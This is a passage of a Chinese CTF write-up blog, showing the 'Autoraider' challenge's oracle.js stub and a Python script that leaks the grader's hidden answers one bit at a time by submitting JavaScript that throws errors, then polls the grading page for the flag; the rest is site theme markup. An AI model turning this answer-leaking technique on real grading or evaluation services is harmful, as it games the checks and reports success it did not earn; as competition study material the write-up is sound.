+<p>oracle.js</p>
+<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// REQUIRES: </span></span><br><span class="line"><span class="comment">//      question_number and personId are integers</span></span><br><span class="line"><span class="comment">//      0 &lt;= question_number &lt; 30</span></span><br><span class="line"><span class="comment">// MODIFIES: nothing</span></span><br><span class="line"><span class="comment">// EFFECTS: invokes an oracle and returns the correct answer to</span></span><br><span class="line"><span class="comment">//      the question indexed by question_number for the person identified by personId</span></span><br><span class="line"><span class="comment">//      a return value of true indicates yes, and a return value of false</span></span><br><span class="line"><span class="comment">//      indicates no</span></span><br><span class="line"><span class="comment">//      if personId &gt; 7754000, should return false</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Hint 1: apply the Cosmic Computation (CC) paradigm</span></span><br><span class="line"><span class="comment">// Hint 2: consider the core principles of Tarot readings</span></span><br><span class="line"><span class="comment">// Hint 3: try to traverse by pointer</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">oracle</span>(<span class="params">personId, questionNumber</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>贴个脚本吧</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">submit_testcase</span>(<span class="params">a, s</span>):</span></span><br><span class="line">    answers = &#123;k: v <span class="keyword">for</span> k, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(a)&#125;</span><br><span class="line">    answers[<span class="built_in">len</span>(answers)] = <span class="literal">True</span></span><br><span class="line">    javascript = <span class="string">&quot;&quot;&quot;\</span></span><br><span class="line"><span class="string">    function oracle(personId, questionNumber) &#123;&#123;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        answers = &#123;&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        if (!answers.hasOwnProperty(questionNumber))&#123;&#123;</span></span><br><span class="line"><span class="string">            throw &#x27;x&#x27;</span></span><br><span class="line"><span class="string">        &#125;&#125; else &#123;&#123;</span></span><br><span class="line"><span class="string">            return answers[questionNumber];</span></span><br><span class="line"><span class="string">        &#125;&#125;;</span></span><br><span class="line"><span class="string">    &#125;&#125;;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span>.<span class="built_in">format</span>(answers).replace(<span class="string">&quot;True&quot;</span>, <span class="string">&quot;true&quot;</span>).replace(<span class="string">&quot;False&quot;</span>, <span class="string">&quot;false&quot;</span>)</span><br><span class="line">    r = s.post(<span class="string">&#x27;https://autoraider-bvel4oasra-uc.a.run.app/upload&#x27;</span>, files=<span class="built_in">dict</span>(code=(<span class="literal">None</span>, javascript)))</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;error&#x27;</span> <span class="keyword">in</span> r.text</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">solve</span>():</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    s.get(<span class="string">&#x27;https://autoraider-bvel4oasra-uc.a.run.app&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    answers = <span class="built_in">list</span>()</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(answers) &lt; <span class="number">30</span>:</span><br><span class="line">        res = submit_testcase(answers, s)</span><br><span class="line">        answers.append(res)</span><br><span class="line"></span><br><span class="line">    r = s.get(<span class="string">&#x27;https://autoraider-bvel4oasra-uc.a.run.app/grade&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;flag&#x27;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(r.text)</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        solve()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2022/03/23/pctf/" rel="prev" title="Pragyan CTF 2022">
+      <i class="fa fa-chevron-left"></i> Pragyan CTF 2022
+    </a></div>
+      <div class="post-nav-item"></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#java"><span class="nav-number">1.</span> <span class="nav-text">java???</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-401"><span class="nav-number">2.</span> <span class="nav-text">XSS 401</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Don%E2%80%99t-Only-Mash%E2%80%A6-Clobber"><span class="nav-number">3.</span> <span class="nav-text">Don’t Only Mash… Clobber!</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Autoraider"><span class="nav-number">4.</span> <span class="nav-text">Autoraider</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Y0ng"
+      src="/images/cys.jpg">
+  <p class="site-author-name" itemprop="name">Y0ng</p>
+  <div class="site-description" itemprop="description">花有重开日，人无再少年</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">168</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="mailto:1216043519@qq.com" title="E-Mail → mailto:1216043519@qq.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 
+  <span itemprop="copyrightYear">2022</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Y0ng</span>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
